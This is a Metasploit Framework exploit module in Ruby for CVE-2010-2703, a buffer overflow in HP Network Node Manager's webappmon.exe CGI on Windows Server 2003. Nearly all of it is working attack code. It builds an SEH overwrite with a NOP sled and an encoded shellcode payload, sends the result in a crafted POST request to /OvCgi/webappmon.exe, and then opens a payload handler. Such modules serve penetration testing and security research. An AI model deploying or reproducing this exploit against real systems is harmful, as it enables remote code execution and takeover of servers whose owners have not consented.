# $Id: hp_nnm_webappmon_execvp.rb 12086 2011-03-23 03:38:46Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::Remote::Seh
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;        => "HP NNM CGI webappmon.exe execvp Buffer Overflow",
            &#039;Description&#039; => %q{
                This module exploits a buffer overflow in HP NNM&#039;s webappmon.exe.
                The vulnerability occurs when function "execvp_nc" fails to do any bounds-
                checking before strcat is used to append user-supplied input to a buffer.
            },
            &#039;License&#039;     => MSF_LICENSE,
            &#039;Version&#039;     => "$Revision: 12086 $",
            &#039;Author&#039;      =>
                [
                    &#039;shahin <shahin[at]abysssec.com>&#039;,
                    &#039;sinn3r&#039;,
                ],
            &#039;References&#039; =>
                [
                    [&#039;CVE&#039;, &#039;2010-2703&#039;],
                    [&#039;OSVDB&#039;, &#039;66514&#039;],
                ],
            &#039;Payload&#039;    =>
                {
                    &#039;BadChars&#039; => [*(0x00..0x09)].pack("C*") + [*(0x0a..0x0f)].pack("C*") + [*(0x10..0x1f)].pack("C*") + "\x7f",
                    &#039;EncoderType&#039; => Msf::Encoder::Type::AlphanumMixed,
                    &#039;EncoderOptions&#039; => {&#039;BufferRegister&#039;=>&#039;ECX&#039;},
                },
            &#039;DefaultOptions&#039; =>
                {
                    &#039;ExitFunction&#039; => "seh",
                    &#039;AutoRunScript&#039; => &#039;migrate -f&#039;,
                },
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Targets&#039;    =>
                [
                    [ &#039;Windows Server 2003 Ent&#039;, {&#039;Ret&#039;=>0x5A30532D} ],
                ],
            &#039;DisclosureDate&#039; => "SEP 6 2010"))
 
            register_options(
                [
                    Opt::RPORT(80),
                ], self.class)
    end
 
    def exploit
        nops = make_nops(1000)*10
 
        sploit = nops[0, 5455]
        sploit << generate_seh_record(target.ret)
        sploit << "\x61"*13
        sploit << "\x51"
        sploit << "\xc3"
        sploit << nops[0, 57]
        sploit << payload.encoded
        sploit << nops[0, 10000-sploit.length]
 
        post_data = "ins=#{sploit}&sel=#{sploit}&app=#{sploit}&act=#{sploit}&arg=#{sploit}&help=#{sploit}&cache=1600 HTTP/1.1"
 
        connect
 
        print_status("Sending malicious request...")
        send_request_raw({
            &#039;uri&#039; => &#039;/OvCgi/webappmon.exe&#039;,
            &#039;data&#039; => post_data,
            &#039;version&#039; => &#039;1.1&#039;,
            &#039;method&#039; => &#039;POST&#039;,
            &#039;headers&#039; => {
                &#039;Accept&#039; => &#039;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#039;,
                &#039;Accept-Language&#039; => &#039;en-us,en;q=0.5&#039;,
                &#039;Accept-Encoding&#039; => &#039;gzip,deflate&#039;,
                &#039;Accept-Charset&#039; => &#039;ISO-8859-1,utf-8;q=0.7,*;q=0.7&#039;,
                &#039;Keep-Alive&#039; => &#039;300&#039;,
                &#039;Connection&#039; => &#039;Keep-Alive&#039;,
                &#039;Cache-Control&#039; => &#039;max-age=0&#039;,
                &#039;Content-Length&#039; => post_data.length,
                &#039;Content-Type&#039; => &#039;application/x-www-form-urlencoded&#039;,
            }
        }, 3)
 
        handler
        disconnect
 
    end
end



